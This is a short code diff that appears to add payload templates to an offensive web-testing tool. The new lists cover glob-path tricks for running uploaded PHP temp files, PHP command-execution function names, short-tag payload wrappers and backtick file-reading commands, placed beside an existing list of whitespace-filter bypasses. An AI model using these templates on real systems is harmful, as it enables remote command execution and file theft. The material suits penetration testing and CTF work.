@@ -68,3 +68,30 @@ SPACE_BYPASS_TEMPLATES = [
     "{payload}".replace(" ", "%09"),
     "{payload}".replace(" ", "%a0"),
 ]
+
+# Upload File
+UPLOAD_EXEC_TEMPLATES = [
+    ". /???/????????[@-[]",
+    ". /tmp/php??????",
+    ". /var/tmp/php??????",
+]
+
+# PHP Command Execution Functions
+PHP_EXEC_WRAPPERS = [
+    "system",
+    "passthru",
+    "shell_exec",
+    "exec",
+]
+
+# Short Tag Templates
+SHORT_TAG_TEMPLATES = [
+    "<?={payload}?>",
+    "<?= {payload} ?>",
+]
+
+# Backtick Templates
+BACKTICK_TEMPLATES = [
+    "`{path}`",
+    "`cat {path}`",
+]
